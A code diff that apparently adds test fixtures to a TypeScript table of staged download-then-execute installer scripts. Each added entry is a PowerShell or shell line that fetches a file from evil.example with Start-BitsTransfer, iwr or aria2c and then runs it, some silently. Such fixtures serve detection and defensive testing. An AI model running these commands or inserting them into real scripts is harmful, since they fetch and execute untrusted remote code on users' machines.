@@ -56,6 +56,38 @@ const STAGED_SIBLINGS: Record<string, [string, string]> = {
     "install.ps1",
     'Start-BitsTransfer -Source https://evil.example/x.exe -Destination x.exe\n& .\\x.exe\n',
   ],
+  "Start-BitsTransfer then Start-Process": [
+    "install.ps1",
+    "Start-BitsTransfer -Source https://evil.example/x.msi -Destination x.msi\nStart-Process x.msi\n",
+  ],
+  "Start-BitsTransfer then Start-Process -FilePath": [
+    "install.ps1",
+    "Start-BitsTransfer -Source https://evil.example/x.ps1 -Destination x.ps1\nStart-Process -FilePath x.ps1\n",
+  ],
+  "Start-BitsTransfer then msiexec /i": [
+    "install.ps1",
+    "Start-BitsTransfer -Source https://evil.example/x.msi -Destination x.msi\nmsiexec /i x.msi\n",
+  ],
+  "Start-BitsTransfer $packagePath then Start-Process": [
+    "install.ps1",
+    "Start-BitsTransfer -Source https://evil.example/x.exe -Destination $packagePath\nStart-Process $packagePath -ArgumentList \"/VERYSILENT\" -Wait\n",
+  ],
+  "Start-BitsTransfer $downloadUrl to $packagePath then Start-Process": [
+    "install.ps1",
+    "Start-BitsTransfer -Source $downloadUrl -Destination $packagePath -ErrorAction Stop\nStart-Process $packagePath -ArgumentList \"/VERYSILENT\" -Wait\n",
+  ],
+  "Start-BitsTransfer $env Destination then Start-Process msiexec ArgumentList": [
+    "install.ps1",
+    'Start-BitsTransfer -Source https://evil.example/x.msi -Destination "$env:USERPROFILE\\Downloads\\x.msi"\nStart-Process msiexec.exe -Wait -ArgumentList "/i $env:USERPROFILE\\Downloads\\x.msi /qn"\n',
+  ],
+  "iwr -OutFile then Start-Process": [
+    "install.ps1",
+    "iwr https://evil.example/x.ps1 -OutFile x.ps1\nStart-Process x.ps1\n",
+  ],
+  "aria2c -o then Start-Process": [
+    "install.ps1",
+    "aria2c -o x.ps1 https://evil.example/x.ps1\nStart-Process x.ps1\n",
+  ],
   "aria2c staged with sudo -E sh": [
     "install.sh",
     "#!/bin/sh\naria2c -o /tmp/x.sh https://evil.example/x.sh\nsudo -E sh /tmp/x.sh\n",
